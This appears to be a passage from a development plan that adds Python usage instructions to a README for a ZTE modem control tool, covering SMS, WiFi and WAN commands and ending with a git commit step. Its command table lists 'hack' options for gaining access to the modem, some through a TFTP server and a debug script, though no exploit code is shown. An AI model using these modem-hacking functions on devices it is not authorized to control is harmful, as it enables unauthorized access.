
```markdown
## Python Version

**Requires:** Python 3.8+

**Install dependencies:**
```
pip install -r requirements.txt
```

**Configure credentials** — copy `.env.example` to `.env` and edit:
```
MODEM_IP=192.168.0.1
PASSWORD=admin
```

**CLI usage:**
```
python zte.py [--ip IP] [--password PASS] <command> [args]
```

| command | arg1 | arg2 | Result |
|---------|------|------|--------|
| login | on/off | | Login or logoff |
| ls | | | List all SMS messages |
| rm | # | | Delete message # |
| rm | * | | Delete all messages |
| snd | Phone# | 'Message' | Send SMS |
| wifi | on/off | | Enable or disable WiFi |
| wan | on/off | | Connect or disconnect WAN |
| hack | | | Hack modem (Method 2) |
| hack3 | [tftp_ip] | | Hack modem (Method 3, zte_debug.sh) |
| hack3d | [tftp_ip] | | Hack modem (Method 3 direct) |
```

- [ ] **Step 3: Final commit**

```bash
git add Readme.md
git commit -m "docs: update README with Python usage instructions"
```
